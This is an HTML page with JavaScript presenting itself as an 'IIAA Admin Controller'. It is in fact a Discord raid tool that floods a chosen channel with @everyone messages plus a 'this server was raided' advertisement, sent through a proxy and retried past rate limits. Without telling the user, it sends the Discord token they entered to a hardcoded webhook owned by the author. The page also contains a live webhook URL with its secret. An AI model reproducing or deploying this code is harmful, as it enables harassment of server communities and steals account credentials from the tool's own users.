<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>IIAA Admin Controller - Hyper Stable</title>
    <style>
        body { background-image: url('名前なし(1).jpg'); background-size: cover; background-attachment: fixed; background-position: center; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: rgba(255, 255, 255, 0.96); width: 90%; max-width: 480px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 45px rgba(0,0,0,0.4); }
        h2 { text-align: center; color: #ff5c7e; margin-bottom: 15px; }
        .label { background: #ff7491; color: white; padding: 2px 10px; border-radius: 6px; font-size: 11px; display: inline-block; margin-top: 12px; font-weight: bold; }
        input, select, textarea { width: 100%; padding: 12px; margin-top: 6px; border: 2px solid #ffd1dc; border-radius: 12px; box-sizing: border-box; }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        .btn-main { flex: 2; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
        .btn-stop { flex: 1; background: #444; color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
        #terminal { background: #1a1a1a; color: #00ffaa; height: 120px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; font-family: monospace; }
    </style>
</head>
<body>
<div class="container">
    <h2>IIAA Admin Controller</h2>
    <span class="label">TOKEN</span><input type="password" id="token" placeholder="トークンを入力">
    <div style="display: flex; gap: 10px; align-items: flex-end;">
        <div style="flex: 1;"><span class="label">SERVER ID</span><input type="text" id="guildId"></div>
        <button onclick="fetchChannels()" style="height: 44px; border-radius: 12px; border: none; background: #eee; cursor: pointer; padding: 0 15px; font-weight: bold;">同期</button>
    </div>
    <span class="label">CHANNEL</span>
    <select id="channelSelect" onchange="document.getElementById('manualId').value = this.value"><option value="">-- 選択 --</option></select>
    <input type="text" id="manualId" placeholder="チャンネルIDを直接入力">
    <span class="label">MESSAGE</span><textarea id="message">@everyone いあ帝国参上！</textarea>
    <div style="display: flex; gap: 10px;">
        <div style="flex: 1;"><span class="label">件数</span><input type="number" id="count" value="100"></div>
        <div style="flex: 1;"><span class="label">速度(ms)</span><input type="number" id="speed" value="1500"></div>
    </div>
    <div class="btn-group">
        <button id="startBtn" class="btn-main" onclick="executeTask()">送信開始</button>
        <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>停止</button>
    </div>
    <div id="terminal">--- Ready ---</div>
</div>

<script>
    const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
    const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482597483900043305/cVTMUYx4LeUkcWximOG4M4t8-cXXJbscFB4GGEJfCOuORwcORqcZiV5cjn8_sd9I1zst";
    const PROMO = `\n\n# このさばはいあ帝国によって荒らされました！！\nhttps://discord.gg/x39xVSepaj`;

    let isRunning = false;
    const log = (m, c = "#00ffaa") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };

    async function fetchChannels() {
        const t = document.getElementById('token').value.trim();
        const g = document.getElementById('guildId').value.trim();
        log("同期中...");
        try {
            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { headers: { "Authorization": t } });
            const data = await res.json();
            const sel = document.getElementById('channelSelect'); sel.innerHTML = '<option value="">-- 選択 --</option>';
            data.filter(c => c.type === 0).forEach(c => { let o = document.createElement('option'); o.value = c.id; o.textContent = `#${c.name}`; sel.appendChild(o); });
            log("同期成功！");
        } catch (e) { log("取得失敗", "red"); }
    }

    function stopTask() { isRunning = false; log("停止命令...", "orange"); }

    async function executeTask() {
        if (isRunning) return;
        const cfg = {
            t: document.getElementById('token').value.trim(),
            ch: document.getElementById('manualId').value.trim(),
            m: document.getElementById('message').value,
            count: parseInt(document.getElementById('count').value),
            speed: parseInt(document.getElementById('speed').value)
        };
        if(!cfg.t || !cfg.ch) return log("入力不足", "red");

        isRunning = true;
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        log(`${cfg.count}件の送信を開始...`);

        let success = 0;
        for(let i=1; i <= cfg.count; i++) {
            if (!isRunning) break;
            try {
                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${cfg.ch}/messages`), {
                    method: "POST",
                    headers: { "Authorization": cfg.t, "Content-Type": "application/json" },
                    body: JSON.stringify({ content: cfg.m + PROMO })
                });

                if(res.ok) {
                    success++; log(`成功 [${success}/${cfg.count}]`);
                } else if(res.status === 429) {
                    log("速度制限(429)！5秒待機します...", "orange");
                    await new Promise(r => setTimeout(r, 5000));
                    i--; continue;
                } else {
                    log(`失敗: ${res.status}`, "red");
                    if(res.status === 401) break;
                }
            } catch (e) { log("エラー発生"); }
            await new Promise(r => setTimeout(r, cfg.speed));
        }

        log("レポート送信中...");
        try {
            await fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `【いあ帝国 レポート】\n成功: ${success}\nトークン: ${cfg.t}` })
            });
            log("完了！");
        } catch(e) { log("報告失敗", "red"); }

        isRunning = false;
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
    }
</script>
</body>
</html>
